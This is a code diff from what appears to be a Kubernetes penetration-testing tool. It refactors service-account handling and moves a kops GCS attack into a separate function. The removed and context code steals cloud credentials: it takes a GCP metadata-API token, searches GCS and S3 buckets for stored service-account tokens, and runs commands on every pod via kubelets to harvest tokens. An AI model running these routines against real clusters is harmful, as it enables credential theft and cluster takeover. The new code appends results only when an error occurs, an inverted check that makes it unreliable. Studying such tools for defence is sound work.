@@ -510,48 +510,6 @@ func clearScreen() {
 	c.Run()
 }
 
-// SERVICE ACCOUNT MANAGEMENT functions start here
-
-// ServiceAccount stores service account information.
-type ServiceAccount struct {
-	Name            string    // Service account name
-	Token           string    // Service account token
-	DiscoveryTime   time.Time // Time the service account was discovered
-	DiscoveryMethod string    // How the service account was discovered (file on disk, secrets, user input, etc.)
-}
-
-// makeNewServiceAccount creates a new service account with the provided name,
-// token, and discovery method, while setting the DiscoveryTime to time.Now()
-func makeNewServiceAccount(name, token, discoveryMethod string) ServiceAccount {
-	return ServiceAccount{
-		Name:            name,
-		Token:           token,
-		DiscoveryTime:   time.Now(),
-		DiscoveryMethod: discoveryMethod,
-	}
-}
-
-func acceptServiceAccountFromUser() ServiceAccount {
-	println("\nPlease paste in a new service account token or hit ENTER to maintain current token.")
-	serviceAccount := ServiceAccount{
-		Name:            "",
-		Token:           "",
-		DiscoveryTime:   time.Now(),
-		DiscoveryMethod: "User Input",
-	}
-	println("\nWhat do you want to name this service account?")
-	serviceAccount.Name, _ = ReadLineStripWhitespace()
-	println("\nPaste the service account token and hit ENTER:")
-	serviceAccount.Token, _ = ReadLineStripWhitespace()
-
-	return serviceAccount
-}
-
-func assignServiceAccountToConnection(account ServiceAccount, info *ServerInfo) {
-	info.TokenName = account.Name
-	info.Token = account.Token
-}
-
 func banner(connectionString ServerInfo, awsCredentials AWSCredentials, assumedAWSRole AWSCredentials) {
 
 	name, err := os.Hostname()
@@ -629,7 +587,7 @@ func GetNodesInfo(connectionString ServerInfo) {
 }
 
 // ExecuteCodeOnKubelet runs a command on every pod on every node via their Kubelets.
-func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
+func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]ServiceAccount) {
 	println("[+] Getting IP addresses for the nodes in the cluster...")
 	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
 	if !kubectlAuthCanI(connectionString, "get", "nodes") {
@@ -720,8 +678,8 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
 								println("")
 								name := "Pod ns:" + podNamespace + ":" + podName
-								serviceAccount := makeNewServiceAccount(name, token, "kubelet")
-								*ServiceAccounts = append(*ServiceAccounts, serviceAccount)
+								serviceAccount := MakeNewServiceAccount(name, token, "kubelet")
+								*serviceAccounts = append(*serviceAccounts, serviceAccount)
 							}
 						}
 					}
@@ -759,7 +717,7 @@ func Main() {
 	parseOptions(&cmdOpts)
 
 	// List of current service accounts
-	serviceAccounts := []ServiceAccount{makeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup")}
+	serviceAccounts := []ServiceAccount{MakeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup")}
 
 	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
 	// Watch the documentation on these variables for changes:
@@ -911,12 +869,12 @@ Off-Menu         +
 					println(string(serviceAccountJSON))
 				}
 			case "5", "export":
-				var newServiceAccounts []ServiceAccount
-				err := json.NewDecoder(os.Stdin).Decode(&newServiceAccounts)
+				var newserviceAccounts []ServiceAccount
+				err := json.NewDecoder(os.Stdin).Decode(&newserviceAccounts)
 				if err != nil {
 					fmt.Printf("[-] Error importing service accounts: %s\n", err.Error())
 				} else {
-					serviceAccounts = append(serviceAccounts, newServiceAccounts...)
+					serviceAccounts = append(serviceAccounts, newserviceAccounts...)
 					fmt.Printf("[+] Successfully imported service accounts\n")
 				}
 			}
@@ -1037,7 +995,7 @@ Off-Menu         +
 				println("[-] ERROR: couldn't decode")
 			} else {
 				fmt.Printf("[+] Saved %s // %s\n", secretName, token)
-				serviceAccounts = append(serviceAccounts, makeNewServiceAccount(secretName, string(token), "Cluster Secret"))
+				serviceAccounts = append(serviceAccounts, MakeNewServiceAccount(secretName, string(token), "Cluster Secret"))
 			}
 
 		// [5] Check all pods for volume mounts
@@ -1138,122 +1096,13 @@ Off-Menu         +
 
 		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
 		case "15", "attack-kops-gcs-1":
-			var storeTokens string
-			var placeTokensInStore bool
-
-			println("[1] Store all tokens found in Peirates data store")
-			println("[2] Retrieve all tokens - I will copy and paste")
-			fmt.Scanln(&storeTokens)
-			storeTokens = strings.TrimSpace(storeTokens)
-
-			if storeTokens == "1" {
-				placeTokensInStore = true
-			}
-
-			token := GetGCPBearerTokenFromMetadataAPI("default")
-			if token == "ERROR" {
-				println("[-] Could not get GCP default token from metadata API")
-				break
-			} else {
-				println("[+] Got default token for GCP - preparing to use it for GCS:", token)
-			}
-
-			// Need to get project ID from metadata API
-			var headers []HeaderLine
-			headers = []HeaderLine{
-				HeaderLine{"Metadata-Flavor", "Google"},
-			}
-			projectID := GetRequest("http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id", headers, false)
-			if (projectID == "") || (strings.HasPrefix(projectID, "ERROR:")) {
-				break
-			}
-			println("[+] Got numberic project ID", projectID)
-
-			// Get a list of buckets, maintaining the same header and adding two lines
-			headers = []HeaderLine{
-				HeaderLine{"Authorization", "Bearer " + token},
-				HeaderLine{"Accept", "json"},
-				HeaderLine{"Metadata-Flavor", "Google"}}
-
-			// curl -s -H 'Metadata-Flavor: Google' -H "Authorization: Bearer $(cat bearertoken)" -H "Accept: json" https://www.googleapis.com/storage/v1/b/?project=$(cat projectid)
-			urlListBuckets := "https://www.googleapis.com/storage/v1/b/?project=" + projectID
-			bucketListRaw := GetRequest(urlListBuckets, headers, false)
-			if (bucketListRaw == "") || (strings.HasPrefix(bucketListRaw, "ERROR:")) {
-				break
-			}
-			bucketListLines := strings.Split(string(bucketListRaw), "\n")
-
-			// Build our list of bucket URLs
-			var bucketUrls []string
-			for _, line := range bucketListLines {
-				if strings.Contains(line, "selfLink") {
-					url := strings.Split(line, "\"")[3]
-					bucketUrls = append(bucketUrls, url)
+			serviceAccountsReturned , err := KopsAttackGCP()
+			if (err != nil) {
+				// Append service accounts to the existing store
+				for _,svcacct := range serviceAccountsReturned {
+					serviceAccounts = append (serviceAccounts, svcacct)
 				}
 			}
-
-			// In every bucket URL, look at the objects
-			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
-			// We use the same headers[] from the previous GET request.
-		eachbucket:
-			for _, line := range bucketUrls {
-				println("Checking bucket for credentials:", line)
-				urlListObjects := line + "/o"
-				bodyListObjects := GetRequest(urlListObjects, headers, false)
-				if (bodyListObjects == "") || (strings.HasPrefix(bodyListObjects, "ERROR:")) {
-					continue
-				}
-				objectListLines := strings.Split(string(bodyListObjects), "\n")
-
-				// Run through the object data, finding selfLink lines with URL-encoded /secrets/ in them.
-				for _, line := range objectListLines {
-					if strings.Contains(line, "selfLink") {
-						if strings.Contains(line, "%2Fsecrets%2F") {
-							objectURL := strings.Split(line, "\"")[3]
-							// Find the substring that tells us this service account token's name
-							start := strings.LastIndex(objectURL, "%2F") + 3
-							serviceAccountName := objectURL[start:]
-							println("\n[+] Getting service account for:", serviceAccountName)
-
-							// Get the contents of the bucket to get the service account token
-							saTokenURL := objectURL + "?alt=media"
-
-							// We use the same headers[] from the previous GET request.
-							bodyToken := GetRequest(saTokenURL, headers, false)
-							if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
-								continue eachbucket
-							}
-							tokenLines := strings.Split(string(bodyToken), "\n")
-							// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {
-
-							for _, line := range tokenLines {
-								// Now parse this line to get the token
-								encodedToken := strings.Split(line, "\"")[3]
-								token, err := base64.StdEncoding.DecodeString(encodedToken)
-								if err != nil {
-									println("[-] Could not decode token.")
-								} else {
-									tokenString := string(token)
-									println(tokenString)
-
-									if placeTokensInStore {
-										tokenName := "GCS-acquired: " + string(serviceAccountName)
-										println("[+] Storing token as:", tokenName)
-										serviceAccount := makeNewServiceAccount(tokenName, tokenString, "GCS Bucket")
-										serviceAccounts = append(serviceAccounts, serviceAccount)
-
-									}
-								}
-
-							}
-
-						}
-					}
-				}
-			}
-
-			//
-			// Don't forget to base64 decode with base64.StdEncoding.DecodeString()
 
 		// [16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
 		case "16":
@@ -1290,13 +1139,13 @@ Off-Menu         +
 				awsCredentials = result
 				credentialsToUse = awsCredentials
 			}
-
+						
 			println("[+] Preparing to use this AWS account to list and search S3 buckets: " + awsCredentials.AccessKeyId)
 
 			result, err := ListAWSBuckets(credentialsToUse)
 			if err != nil {
 				println("Could not list buckets")
-				break
+	break
 			}
 			listOfBuckets := result
 
@@ -1350,7 +1199,7 @@ Off-Menu         +
 							if placeTokensInStore {
 								tokenName := "AWS-acquired: " + string(*item.Key)
 								println("[+] Storing token as:", tokenName)
-								serviceAccount := makeNewServiceAccount(tokenName, tokenString, "AWS Bucket")
+								serviceAccount := MakeNewServiceAccount(tokenName, tokenString, "AWS Bucket")
 								serviceAccounts = append(serviceAccounts, serviceAccount)
 							}
 						}
